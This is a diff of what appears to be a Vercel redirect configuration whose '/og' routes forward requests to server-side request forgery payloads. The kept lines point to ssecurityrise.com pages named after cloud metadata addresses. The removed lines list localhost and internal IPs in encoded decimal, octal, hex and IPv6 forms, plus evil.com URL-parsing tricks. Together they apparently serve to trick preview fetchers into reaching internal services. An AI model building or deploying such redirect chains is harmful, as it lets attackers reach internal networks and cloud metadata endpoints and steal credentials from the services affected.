@@ -20,43 +20,6 @@
     { "source": "/og33", "destination": "https://ssecurityrise.com/169254_latest_user_data.php"},
     { "source": "/og34", "destination": "https://ssecurityrise.com/100.100.100.200.php"},
     { "source": "/og35", "destination": "https://ssecurityrise.com/192.0.0.192.php"},
-    { "source": "/og36", "destination": "https://ssecurityrise.com/173.194.44.70.php"},
-    { "source": "/og37", "destination": "http://google.com:80@127.0.0.1"},
-    { "source": "/og38", "destination": "http://evil.com#vulnsite.com"},
-    { "source": "/og39", "destination": "http://evil.com?vulnsite.com"},
-    { "source": "/og40", "destination": "http://evil.com%00vulnsite.com"},
-    { "source": "/og42", "destination": "http://%31%37%33%2E%31%39%34%2E%34%34%2E%37%30"},
-    { "source": "/og43", "destination": "http://0xad.0xc2.0x2c.0x46"},
-    { "source": "/og44", "destination": "http://0255.0302.0054.0106"},
-    { "source": "/og45", "destination": "http://173.0302.0x2c.70"},
-    { "source": "/og46", "destination": "http://0xad.0302.0x2c.0106"},
-    { "source": "/og47", "destination": "http://2915183686"},
-    { "source": "/og48", "destination": "http://025560426106"},
-    { "source": "/og49", "destination": "http://0xADC22C46"},
-    { "source": "/og50", "destination": "http://127.0.0.1:80"},
-    { "source": "/og51", "destination": "http://localhost:80"},
-    { "source": "/og52", "destination": "https://127.0.0.1:443"},
-    { "source": "/og53", "destination": "https://localhost:80"},
-    { "source": "/og54", "destination": "http://[::]:80"},
-    { "source": "/og55", "destination": "http://0000::1:80"},
-    { "source": "/og56", "destination": "http://[0:0:0:0:0:ffff:127.0.0.1]"},
-    { "source": "/og57", "destination": "http://0/"},
-    { "source": "/og58", "destination": "http://127.1"},
-    {
-      "source": "/og2",
-      "destination": "https://github.com/vercel/vercel"
-    },
-    {
-      "source": "/:path((?!uk/).*)",
-      "has": [
-        {
-          "type": "header",
-          "key": "x-vercel-ip-country",
-          "value": "GB"
-        }
-      ],
-      "destination": "/uk/:path*",
-      "permanent": false
-    }
+    { "source": "/og36", "destination": "https://ssecurityrise.com/173.194.44.70.php"}
   ]
 }
